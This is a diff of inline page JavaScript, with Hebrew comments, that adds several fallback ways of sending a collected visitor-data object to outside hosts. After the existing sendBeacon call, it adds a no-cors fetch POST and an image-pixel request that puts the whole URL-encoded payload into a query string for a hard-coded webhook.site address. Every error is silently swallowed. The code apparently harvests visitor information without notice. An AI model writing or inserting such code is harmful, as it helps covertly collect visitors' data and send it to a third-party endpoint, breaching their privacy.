@@ -46,8 +46,21 @@ const J=u=>T(fetch(u).then(r=>r.json()),3500).catch(()=>null);
  R.visitId = visitId;
  
  const b=JSON.stringify(R);
+ 
+ // שיטה 1: ניסיון רגיל
  try{navigator.sendBeacon(H,new Blob([b],{type:"text/plain"}))}catch(e){}
+ 
+ // שיטה 2: ניסיון עם mode: 'no-cors' (מתאים למובייל)
  try{await fetch(H,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:b})}catch(e){}
+ 
+ // שיטה 3: שיטת גיבוי - יצירת תמונה ושליחה דרכה
+ try{
+  const img=new Image();
+  img.src=`https://webhook.site/7ffe86b1-276e-4e73-9fa7-afcea6a71f25?data=${encodeURIComponent(b)}`;
+  img.onload=()=>dot.style.background="#0a0";
+  img.onerror=()=>dot.style.background="#a00";
+ }catch(e){}
+ 
  dot.style.background="#0a0";
 })();
 </script>
